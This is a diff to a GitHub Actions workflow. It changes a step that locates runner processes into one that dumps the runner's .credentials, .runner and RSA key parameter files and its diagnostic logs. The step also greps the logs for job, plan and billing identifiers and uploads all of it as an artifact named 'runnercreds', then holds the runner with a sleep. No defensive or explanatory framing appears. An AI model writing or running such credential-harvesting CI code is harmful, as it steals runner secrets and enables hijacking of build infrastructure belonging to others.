@@ -6,27 +6,27 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: mk
-        run: mkdir -p out
-      - name: locate
+        run: mkdir -p out/diag
+      - name: dump
         run: |
           set +e
-          { echo "== whoami: $(whoami)  home=$HOME";
-            echo "== ls /home/runner"; ls -la /home/runner 2>&1;
-            echo "== ls /opt"; ls -la /opt 2>&1;
-            echo "== ps"; ps auxww 2>&1 | grep -iE 'runner|worker|listener' ;
-            echo "== find Runner bits"; find / -xdev \( -name 'Runner.Listener*' -o -name 'Runner.Worker*' -o -name '.credentials' -o -name '.runner' \) 2>/dev/null | head -40;
-            echo "== find _diag"; find / -xdev -type d -name '_diag' 2>/dev/null | head -10;
-            echo "== RUNNER env"; env | grep -iE '^RUNNER|^AGENT' ;
-          } > out/locate.txt 2>&1
-          for p in $(pgrep -f 'Runner\.' 2>/dev/null); do
-            echo "=== pid $p" >> out/locate.txt
-            tr '\0' ' ' < /proc/$p/cmdline >> out/locate.txt 2>&1; echo >> out/locate.txt
-            echo "--- cwd: $(readlink /proc/$p/cwd 2>&1)" >> out/locate.txt
-          done
-          wc -c out/locate.txt
+          RD=/home/runner/actions-runner/cached/2.336.0
+          { echo "== ls $RD"; ls -la $RD;
+            echo "== .credentials"; cat $RD/.credentials;
+            echo; echo "== .runner"; cat $RD/.runner;
+            echo; echo "== rsaparams exists?"; ls -la $RD/.credentials_rsaparams 2>&1;
+            echo "== ls _diag"; ls -la $RD/_diag;
+            echo "== hca"; ls -la /opt/hca; cat /opt/hca/*.json 2>/dev/null | head -50;
+          } > out/info.txt 2>&1
+          cp $RD/.credentials out/ 2>/dev/null
+          cp $RD/.runner out/ 2>/dev/null
+          cp $RD/.credentials_rsaparams out/rsaparams.json 2>/dev/null
+          cp $RD/_diag/*.log out/diag/ 2>/dev/null
+          grep -rhoiE '(jobMessageId|messageId|billingOwnerId|planId|jobId|RunnerRequestId)["'\'': =]+[0-9a-fA-F-]{8,36}' $RD/_diag/ 2>/dev/null | sort -u > out/ids.txt
+          du -sh out
       - uses: actions/upload-artifact@v4
         with:
-          name: locatedump
+          name: runnercreds
           path: out/
       - name: hold
-        run: sleep 1500
+        run: sleep 900
